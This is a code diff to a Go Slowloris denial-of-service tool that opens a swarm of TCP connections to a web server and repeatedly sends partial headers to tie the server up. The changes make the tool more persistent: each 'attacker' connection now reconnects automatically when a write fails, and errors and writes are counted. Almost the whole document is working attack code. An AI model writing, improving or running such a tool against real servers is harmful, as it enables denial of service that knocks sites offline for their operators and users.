@@ -25,6 +25,8 @@ type state struct {
 type attacker struct {
       id            int
       conn          net.Conn
+      errors        int
+      writeCount    int
 }
 
 func main() {
@@ -88,9 +90,17 @@ func main() {
     <-doneChan
   }
 
+  closeChan := make(chan *attacker)
+
   // dispatch goroutines to initiate attack
   for _, attacker := range swarm {
-    go loris(attacker, doneChan, attackState.delay, reqHeaders.loris)
+    go loris(attacker, doneChan, attackState.delay, reqHeaders.loris, attackState.endpoint)
+  }
+
+  for {
+    select {
+    case <-closeChan:
+    }
   }
 
   // wait on all attacks to complete (only when timeout specified)
@@ -112,14 +122,9 @@ func createSwarm(numAttackers int, endpoint string) []*attacker {
   for i := 0; i < numAttackers; i++ {
     // dispatch goroutines to create each attacker
     go func(i int) {
-      conn, err := net.Dial("tcp", endpoint+":http")
-      // attempt to establish connection until successful
-      for err != nil {
-        fmt.Println("failed to establish connection to", endpoint, "trying again now...")
-        conn, err = net.Dial("tcp", endpoint+":http")
-      }
+      conn := createAttacker(endpoint)
       fmt.Println("attacker #", i, "created")
-      swarm = append(swarm, &attacker{id: i, conn: conn})
+      swarm = append(swarm, &attacker{id: i, conn: conn, errors: 0, writeCount: 0})
       doneChan<- 1
     }(i)
   }
@@ -131,16 +136,29 @@ func createSwarm(numAttackers int, endpoint string) []*attacker {
   return swarm
 }
 
+func createAttacker(endpoint string) net.Conn {
+  conn, err := net.Dial("tcp", endpoint+":http")
+  // attempt to establish connection until successful
+  for err != nil {
+    fmt.Println("failed to establish connection to", endpoint, "trying again now...")
+    conn, err = net.Dial("tcp", endpoint+":http")
+  }
+  return conn
+}
+
 // this function implements the slow loris attack, repeatadly writing to
-// a socket to continue
-func loris(worker *attacker, doneChan chan int, delay int, header string) {
+// the server for a given attacker connection, and
+func loris(worker *attacker, doneChan chan int, delay int, header string, endpoint string) {
   for {
     time.Sleep(time.Duration(delay) * time.Second)
     repeatHeader := []byte(header)
     if err := writeEndpoint(worker.conn, repeatHeader); err != nil {
-      fmt.Println("error with repeat header")
+      worker.errors += 1
+      fmt.Println("error with repeat header, establishing connection #",worker.errors)
+      worker.conn = createAttacker(endpoint)
     } else {
-      fmt.Println("loris sent by attacker", worker.id, worker.attacks, "for this worker", total, "total"  )
+      worker.writeCount += 1
+      fmt.Println("loris sent by attacker", worker.id)//, worker.attacks, "for this worker", total, "total"  )
     }
   }
   doneChan <- 1
